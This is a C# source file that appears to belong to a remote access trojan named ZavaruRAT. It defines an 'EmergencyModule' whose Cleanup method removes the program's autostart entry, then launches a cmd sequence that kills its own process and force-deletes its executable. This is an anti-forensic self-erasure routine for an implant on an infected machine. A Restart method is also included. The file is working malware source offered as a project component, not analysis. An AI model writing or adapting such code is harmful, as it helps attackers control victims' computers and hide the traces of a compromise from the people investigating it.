#region

using System.Diagnostics;
using ZavaruRAT.Client.Sdk;

#endregion

namespace ZavaruRAT.Client.Modules;

/// <summary>
///     Module with functions in case something goes wrong
/// </summary>
public sealed class EmergencyModule : ModuleBase
{
    public Task<ExecutionResult> Cleanup()
    {
        Installation.ForceRemoveAutoStart();

        var currentExe = Installation.ExecutablePath;
        var currentPid = Environment.ProcessId;

        var cmd = $@"
ping 127.0.0.1 -n 2 > nul
taskkill /pid {currentPid} /f
ping 127.0.0.1 -n 3 > nul
del /f ""{currentExe}""
".Commandify();

        Debug.WriteLine(cmd);

        var procInfo = new ProcessStartInfo
        {
            FileName = "cmd",
            Arguments = "/c " + cmd,
            WorkingDirectory = Path.GetDirectoryName(currentExe)
        };
        Process.Start(procInfo);

        throw new ApplicationException("Goodbye!");
    }

    public Task<ExecutionResult> Restart()
    {
        Installation.Restart();

        return Task.FromResult(new ExecutionResult());
    }
}
